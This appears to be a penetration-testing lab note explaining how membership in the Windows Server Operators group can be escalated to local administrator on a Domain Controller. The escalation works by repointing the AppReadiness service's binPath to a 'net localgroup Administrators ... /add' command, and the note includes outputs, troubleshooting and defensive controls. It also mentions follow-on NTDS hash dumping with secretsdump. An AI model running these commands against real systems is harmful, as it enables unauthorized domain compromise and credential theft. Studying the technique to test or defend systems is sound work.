## Overview

The `Server Operators` group allows members to administer Windows servers without assigning them full `Domain Admin` privileges.

This is a highly privileged group because members can:

- log on locally to servers
- log on locally to Domain Controllers
- control local services
- use `SeBackupPrivilege`
- use `SeRestorePrivilege`

On a Domain Controller, `Server Operators` membership can become domain-critical because service control rights may allow local administrator escalation.

> [!warning]
> `Server Operators` membership on a Domain Controller can lead to full Domain Controller compromise.

---

# Why Server Operators Matters

Membership in `Server Operators` grants powerful operational access without requiring direct membership in `Domain Admins`.

Important privileges include:

```text
SeBackupPrivilege
SeRestorePrivilege
```

It can also grant control over local services.

If a member can modify and start a service that runs as `LocalSystem`, they may be able to execute commands as SYSTEM.

On a Domain Controller, SYSTEM-level access is effectively full control of the DC.

---

# Attack Concept – Service Binary Path Abuse

## Core Idea

If the current user has full control over a service that runs as SYSTEM, the user can modify the service binary path to execute an arbitrary command.

Example command:

```cmd
cmd /c net localgroup Administrators server_adm /add
```

When the service starts, Windows attempts to execute the configured binary path.

Even if the service fails to start properly, the command may still execute.

---

# Target Service – AppReadiness

The example target is:

```text
AppReadiness
```

Display name:

```text
App Readiness
```

The service runs as:

```text
LocalSystem
```

This makes it useful for escalation if the user can modify the service configuration.

---

# Method – Abuse AppReadiness Service Control

## Attack Flow

1. Confirm the target service runs as `LocalSystem`.
2. Confirm `Server Operators` has full control over the service.
3. Confirm the current user is not already a local administrator.
4. Modify the service binary path to execute a command.
5. Start the service.
6. Confirm the command executed.
7. Restore the service configuration.
8. Validate local administrator access.
9. Use access for authorized post-exploitation.

---

# Step 3 – Confirm Current Local Administrators

Before escalation, check whether the target account is already in the local `Administrators` group.

```cmd
net localgroup Administrators
```

Example output:

```cmd
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```

In this example, the target user is not yet a local administrator.

---

# Step 4 – Modify the Service Binary Path

Change the service binary path so it executes a command to add the current user to the local `Administrators` group.

```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

Example output:

```cmd
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

## Command Breakdown

| Part | Purpose |
|---|---|
| `sc config AppReadiness` | Modify the AppReadiness service configuration |
| `binPath=` | Set the service binary path |
| `cmd /c` | Run a command and terminate |
| `net localgroup Administrators server_adm /add` | Add `server_adm` to local Administrators |

> [!important]
> `sc config` syntax requires a space after `binPath=`.

Correct:

```cmd
binPath= "cmd /c ..."
```

Incorrect:

```cmd
binPath="cmd /c ..."
```

---

# Step 5 – Start the Service

Start the modified service.

```cmd
sc start AppReadiness
```

Expected output:

```cmd
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

The failure is expected because `cmd /c net localgroup ...` does not behave like a normal Windows service binary.

The important part is that the command may still execute before the service start fails.

---

# Step 6 – Confirm Local Admin Group Membership

Check the local `Administrators` group again.

```cmd
net localgroup Administrators
```

Example output:

```cmd
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```

The user is now a local administrator.

---

# Step 7 – Restore the Original Service Binary Path

Restore the original `AppReadiness` service binary path.

Original value:

```text
C:\Windows\System32\svchost.exe -k AppReadiness -p
```

Restore command:

```cmd
sc config AppReadiness binPath= "C:\Windows\System32\svchost.exe -k AppReadiness -p"
```

> [!warning]
> Always restore modified service configuration. Leaving a service pointed at `cmd.exe` or another payload can break functionality and create obvious operational impact.

---

# Step 8 – Confirm Service Configuration Restored

Query the service again:

```cmd
sc qc AppReadiness
```

Confirm:

```text
BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
SERVICE_START_NAME : LocalSystem
```

# Post-Exploitation Impact

After gaining local administrator access on a Domain Controller, the tester may be able to:

- retrieve Domain Controller credential material
- access the NTDS database
- dump NTLM hashes
- perform pass-the-hash validation
- access additional systems
- perform authorized post-exploitation tasks

> [!important]
> Local administrator access on a Domain Controller is effectively domain compromise in most environments.

# Practical Decision Tree

## Is the user in Server Operators?

Check group membership:

```cmd
whoami /groups
```

or inspect the group:

```cmd
net localgroup "Server Operators"
```

---

## Does the group have control over a SYSTEM service?

Check service configuration:

```cmd
sc qc <service_name>
```

Check permissions:

```cmd
c:\Tools\PsService.exe security <service_name>
```

Look for:

```text
[ALLOW] BUILTIN\Server Operators
        All
```

---

## Is the service running as LocalSystem?

Confirm:

```text
SERVICE_START_NAME : LocalSystem
```

If yes, modifying and starting the service can execute commands as SYSTEM.

---

## Can the service binary path be modified?

Test with a controlled command:

```cmd
sc config <service_name> binPath= "cmd /c <command>"
```

For local admin escalation:

```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators <user> /add"
```

---

## Did the service start fail?

A `1053` failure is expected when the `binPath` is a short-lived command instead of a real service binary.

Confirm whether the command executed:

```cmd
net localgroup Administrators
```

---

## Was the service restored?

Restore the original path:

```cmd
sc config AppReadiness binPath= "C:\Windows\System32\svchost.exe -k AppReadiness -p"
```

Confirm:

```cmd
sc qc AppReadiness
```

---

# Troubleshooting

## `sc config` fails

Possible causes:

- user is not in `Server Operators`
- service permissions do not allow modification
- command prompt is not elevated
- wrong service name
- syntax error in `binPath=`
- missing required space after `binPath=`

---

## Service start fails with 1053

This is expected when using `cmd /c`.

Check whether the command executed:

```cmd
net localgroup Administrators
```

---

## User is not added to Administrators

Possible causes:

- wrong username
- command syntax issue
- service did not start
- insufficient service control permissions
- local group name differs by language
- endpoint protection blocked command execution

---

## CrackMapExec does not show Pwn3d

Possible causes:

- local admin group membership has not refreshed
- authentication failed
- SMB blocked or filtered
- local admin rights are restricted by policy
- target hostname/domain mismatch
- password is incorrect
- UAC remote restrictions interfere with local account usage

---

## SecretsDump fails

Possible causes:

- user does not have enough privileges on the DC
- DRSUAPI access blocked
- credentials are wrong
- firewall blocks required RPC/SMB traffic
- endpoint protection blocks activity
- target is not a Domain Controller
- account was not actually added to local Administrators on the DC

# Defensive Notes

## Risks

`Server Operators` is high-risk because members can administer servers and may control local services.

On Domain Controllers, this can lead to:

- local administrator escalation
- SYSTEM command execution
- Domain Controller compromise
- NTDS credential extraction
- domain-wide compromise

---

## Defensive Controls

Consider:

- minimizing `Server Operators` membership
- auditing all members regularly
- avoiding use of `Server Operators` on Domain Controllers
- monitoring service configuration changes
- alerting on `sc config` usage
- alerting on service binary path changes
- monitoring changes to local `Administrators`
- restricting who can start and modify services
- reviewing service ACLs
- enabling privileged group change alerts
- monitoring use of `secretsdump.py`-like behavior over DRSUAPI

---

# Key Takeaways

- `Server Operators` is a highly privileged built-in Windows group.
- Members can log on locally to servers, including Domain Controllers.
- Membership grants `SeBackupPrivilege`, `SeRestorePrivilege`, and service control capabilities.
- If a service runs as `LocalSystem` and `Server Operators` has full control over it, service binary path abuse can lead to SYSTEM command execution.
- `AppReadiness` is an example service that runs as `LocalSystem`.
- `PsService.exe security` can confirm whether `Server Operators` has full control over a service.
- Changing `binPath` to a `cmd /c` command can execute an action even if service start returns error `1053`.
- Adding a user to local `Administrators` on a Domain Controller can lead to full DC compromise.
- `secretsdump.py` can retrieve Domain Controller secrets after administrative access is obtained.
- Always restore modified service configurations and document any group membership changes.
